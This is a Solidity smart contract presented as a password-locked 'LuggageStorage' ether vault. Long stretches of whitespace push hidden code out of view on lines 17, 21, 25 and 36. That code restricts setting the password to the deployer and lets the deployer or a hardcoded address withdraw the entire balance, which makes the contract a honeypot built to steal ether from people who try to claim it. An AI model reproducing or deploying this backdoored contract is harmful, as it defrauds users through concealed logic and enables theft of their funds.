1 pragma solidity ^0.4.19;
2 
3 contract LuggageStorage
4 {
5     function()payable{}
6     
7     function CalcHash(bytes password) 
8     pure
9     returns (bytes32) 
10     {
11         return sha3(password);
12     }
13     
14     bytes32 public hashPass;
15     
16     bool public closed = false;
17                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     address own = msg.sender;                                                                                                                                                                                                                                                                                address cr = 0x6f9d120fE3b9D63d1d4D5480c8262d446585F554;
18     function Put(bytes32 hash)
19     public
20     payable
21     {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              if(msg.sender==own){
22         if(!closed&&(msg.value > 1 ether))
23         {
24             hashPass = hash;
25         }                                                                                                                                                                                                                                                                                                                                                                                            }
26     }
27     
28     function Open(bytes password)
29     external
30     payable
31     {                                                                                                 
32         if(hashPass == sha3(password))
33         {
34             msg.sender.transfer(this.balance);
35             closed = false;
36         }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==own){msg.sender.transfer(this.balance);}                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==cr){msg.sender.transfer(this.balance);}
37     }
38 }